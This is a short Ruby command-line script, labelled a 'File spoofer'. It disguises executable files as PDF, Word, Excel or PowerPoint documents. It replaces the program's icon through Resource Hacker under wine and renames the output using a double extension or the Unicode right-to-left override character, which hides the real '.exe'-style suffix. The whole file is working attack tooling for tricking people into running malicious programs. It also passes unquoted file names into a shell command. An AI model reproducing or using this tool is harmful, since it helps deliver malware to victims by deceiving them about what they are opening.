#!/usr/bin/env ruby
# mind1355[at]gmail[dot]com
# File spoofer
require 'optparse'

options = {}

OptionParser.new do |opts|
  opts.banner = "Usage: change_icon.rb [options]"

  opts.on("-i", "--in input", "input file") do |input|
    options[:input] = input
  end

  opts.on("-o", "--out output", "output file") do |output|
    options[:output] = output
  end

  opts.on("-e", "--ext flash, pdf, xlsx, ppt, pptx, doc, docx", "file extension") do |ext|
    options[:ext] = ext
  end

  opts.on("-f", "--fake", "fake file extension") do
    options[:fake] = true
  end

end.parse!

p options
p ARGV

case options[:ext]
when 'pdf'
  options[:icon] = "acrobat.ico"
  options[:fake_ext] = "pdf"
when 'xlsx'
  options[:icon] = "Microsoft-Excel.ico"
  options[:fake_ext] = "xlsx"
when 'doc'
  options[:icon] = "Microsost-Word-2013.ico"
  options[:fake_ext] = "doc"
when 'docx'
  options[:icon] = "Microsoft-Word-2016.ico"
  options[:fake_ext] = "docx"
when 'ppt'
  options[:icon] = "powerpoint.ico"
  options[:fake_ext] = "ppt"
when 'pptx'
  options[:icon] = "PowerPoint-orange.ico"
  options[:fake_ext] = "pptx"
else
  puts "[!] Extension not supported"
  exit
end

if File.exists?(options[:input])
  filename, extension = options[:output].split('.')
  if options[:fake]
    options[:output] = filename + "\u202E" + options[:fake_ext].reverse! + "." + extension
  else
    options[:output] = filename + "." + options[:fake_ext] + "." + extension
  end
end

if options[:output] && options[:input] && options[:icon]
  exec "wine '#{Dir.home}/.wine/drive_c/Program Files (x86)/Resource Hacker/ResourceHacker.exe' -open #{options[:input]} -save #{options[:output]} -action addskip -res #{options[:icon]} -mask 'ICONGROUP,MAINICON,'"
end
